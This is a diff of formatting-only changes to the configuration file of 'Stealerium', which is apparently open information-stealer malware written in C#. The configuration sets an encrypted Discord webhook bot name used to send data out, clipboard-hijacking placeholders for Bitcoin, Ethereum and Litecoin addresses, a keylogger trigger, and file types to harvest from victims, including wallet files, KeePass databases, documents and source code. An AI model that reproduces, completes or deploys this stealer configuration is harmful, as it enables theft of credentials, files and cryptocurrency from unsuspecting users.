@@ -82,15 +82,15 @@ namespace Stealerium
 
         // Discord Webhook bot username
         public static string Username = StringsCrypt.Decrypt(new byte[]
-            {208, 138, 80, 115, 89, 12, 47, 194, 189, 116, 154, 25, 46, 155, 252, 130});
+            { 208, 138, 80, 115, 89, 12, 47, 194, 189, 116, 154, 25, 46, 155, 252, 130 });
 
         // Clipper addresses:
         public static Dictionary<string, string> ClipperAddresses =
             new Dictionary<string, string>
             {
-                {"btc", "--- ClipperBTC ---"}, // Bitcoin
-                {"eth", "--- ClipperETH ---"}, // Ethereum
-                {"ltc", "--- ClipperLTC ---"} // Litecoin
+                { "btc", "--- ClipperBTC ---" }, // Bitcoin
+                { "eth", "--- ClipperETH ---" }, // Ethereum
+                { "ltc", "--- ClipperLTC ---" } // Litecoin
             };
 
         // Start keylogger when active window title contains this text:
@@ -132,15 +132,15 @@ namespace Stealerium
         // Grabber file types:
         public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
         {
-            ["Document"] = new[] {"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json"},
+            ["Document"] = new[] { "pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json" },
             ["DataBase"] = new[]
-                {"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini"},
+                { "db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini" },
             ["SourceCode"] = new[]
             {
                 "c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift",
                 "java", "kt", "kts", "ino"
             },
-            ["Image"] = new[] {"jpg", "jpeg", "png", "bmp", "psd", "svg", "ai"}
+            ["Image"] = new[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
         };
 
         // Decrypt config values
